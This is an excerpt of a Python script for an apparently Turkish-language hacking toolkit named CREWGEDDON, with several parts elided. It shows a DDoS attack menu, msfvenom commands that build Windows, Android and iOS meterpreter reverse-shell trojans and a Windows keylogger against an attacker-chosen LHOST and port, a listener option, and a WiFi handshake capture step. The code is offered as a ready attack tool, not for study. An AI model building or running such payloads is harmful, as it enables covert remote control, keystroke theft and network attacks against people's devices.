    ...
    if select == "1":
        ...
        if ddos_select == 1:
            ...
            while True:
                ...
                time.sleep(0.5)
                print(
                    Fore.RED + "[CREWGEDDON-DDOS]: " + Fore.GREEN + f"Saldırı {ip} adresine başladı. Durum: (%{counter})")
                counter = counter + 1
                if counter >= 5000:
        ...
        if rat_select == 0:
            ...
            os.system(
                f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip_adress} LPORT={port} -f exe > {exe_name}.exe")
            print(
                Fore.GREEN + f"[CREWGEDDON-DesktopRAT]: {exe_name}.exe oluşturuldu ve root/{exe_name}.exe bölümüne kayıt edildi.")
        elif rat_select == 2:
            ...
            os.system(
                f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip_adress} LPORT={port} -f apk > {apk_name}.apk")
            print(
                Fore.GREEN + f"[CREWGEDDON-AndroidRAT]: {apk_name}.apk oluşturuldu ve root/{exe_name}.apk bölümüne kayıt edildi.")
        elif rat_select == 3:
            ...
            os.system(
                f"msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST={ip_adress} LPORT={port} -f macho > {app_name}.macho")
            print(
                Fore.GREEN + f"[CREWGEDDON-iOSRAT]: {app_name}.macho oluşturuldu ve root/{exe_name}.macho bölümüne kayıt edildi.")
        elif rat_select == 4:
            print(Fore.BLUE + "[CREWGEDDON]: Dinleyici'ye hoş geldiniz.")
            ...
            secim_dinleyici = int(input(Fore.LIGHTMAGENTA_EX + "CREWGEDDON-Dinleyici~#: "))

            if secim_dinleyici == 0:
                continue
            elif secim_dinleyici == 1:
                lhost = input(Fore.GREEN + "LHOST: ")
                lport = int(input(Fore.GREEN + "LPORT: "))
        ...
        if keylogger_select == 0:
            ...
            ip_adress = input(Fore.BLUE + "[CREWGEDDON-KeyLogger]: LO CAL IP Adresiniz: ")
            ...
            os.system(
                f"msfvenom -p windows/x64/keylogger/reverse_tcp LHOST={ip_adress} LPORT={port} -f exe > {exe_name}.exe")
            print(
                Fore.GREEN + f"[CREWGEDDON-KeyLogger]: {exe_name}.exe oluşturuldu ve root/{exe_name}.exe bölümüne kayıt edildi.")
        elif keylogger_select == 2:
            port = int(input(Fore.BLUE + "[CREWGEDDON-KeyLogger]: Port: "))
            subprocess.Popen([
                "xterm",
        ...
        if secim_wifi == 0:
            ...
            print(
                Fore.GREEN + "[CREWGEDDON-Wifi]: .cap Dosyası /crewgeddon/crewgeddon_handshake.cap Yoluna kayıt edilecek.")
        else:
            print(Fore.RED + "[CREWGEDDON]:" + Fore.WHITE + " Geçersiz işlem belirttiniz.")
            continue
